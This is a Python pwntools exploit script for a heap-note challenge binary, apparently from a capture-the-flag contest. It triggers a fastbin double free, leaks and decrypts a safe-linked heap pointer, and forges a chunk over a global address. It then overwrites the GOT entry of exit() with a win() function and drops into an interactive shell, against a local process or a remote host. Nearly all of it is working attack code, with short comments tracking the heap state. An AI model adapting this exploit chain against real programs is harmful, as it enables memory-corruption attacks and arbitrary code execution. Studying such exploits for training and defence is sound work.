#!/usr/bin/env python3
import time
from pwn import *

BINARY_PATH = './note'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(BINARY_PATH)

def decrypt_safe_link(addr):
    key = (addr & 0x0000fff000000000) >> (4 * 3)
    decrypted = addr ^ key
    key = (decrypted & 0x0000000fff000000) >> (4 * 3)
    decrypted = decrypted ^ key
    key = (decrypted & 0x0000000000fff000) >> (4 * 3)
    decrypted = decrypted ^ key
    return decrypted

def create(idx, size, data):
    r.sendline(b'1')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendlineafter(b'size: ', str(size).encode())
    r.sendafter(b'data: ', data)
    r.recvuntil(b'\n> ')

def read(idx):
    r.sendline(b'2')
    r.sendlineafter(b'idx: ', str(idx).encode())
    return r.recvuntil(b'\n> ')

def update(idx, data):
    r.sendline(b'3')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendafter(b'data: ', data)
    r.recvuntil(b'\n> ')

def delete(idx):
    r.sendline(b'4')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.recvuntil(b'\n> ')


def conn():
    if len(sys.argv) == 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(BINARY_PATH)
    return r

r = conn()

r.recvuntil(b'\n> ')

create(5, 0x30, b'a')  # to leverage as a fake chunk for fastbin dup into stack

# exhaust a tcache list
for _ in range(7):
    create(9, 0x20, b'a')
    delete(9)

create(0, 0x20, b'a')  # chunk A
create(1, 0x20, b'b')  # chunk B


# status of fastbin: NULL

delete(0)
# status of fastbin: A -> NULL

delete(1)
# status of fastbin: B -> A -> NULL

delete(0)
# status of fastbin: A -> B -> A -> B -> ..
# pause()
# leak the base address of heap
leak = u64(read(9).split(b'data: ')[1].split(b'\n1. create')[0].ljust(8, b'\x00'))
print('leak..', hex(leak))
decrypted_leak = decrypt_safe_link(leak)
print('decrypted_leak..', hex(decrypted_leak))

fake_chunk_addr = 0x4040f0

create(0, 0x20, p64(fake_chunk_addr ^ ((decrypted_leak >> 12))))  # A
# status of fastbin: B -> A -> B -> ..
# *A = fake_chunk_addr
# status of fastbin: B -> A -> fake_chunk_addr -> ..

create(0, 0x20, b'b')  # B
# status of fastbin: A -> fake_chunk_addr -> ..

create(0, 0x20, b'a')  # A
# # status of fastbin: fake_chunk_addr -> ..
pause()
# overwrite a string pointer with the got entry of exit()
create(0, 0x20, p64(elf.got['exit']))  # malicious chunk *_*
pause()
# overwrite the got entry of exit() with win()
update(5, p64(0x0000000000401256))  # win()
# pause()
# get shell by calling exit()
r.sendline(b'1')
r.sendlineafter(b'idx: ', b'-1')
r.interactive()
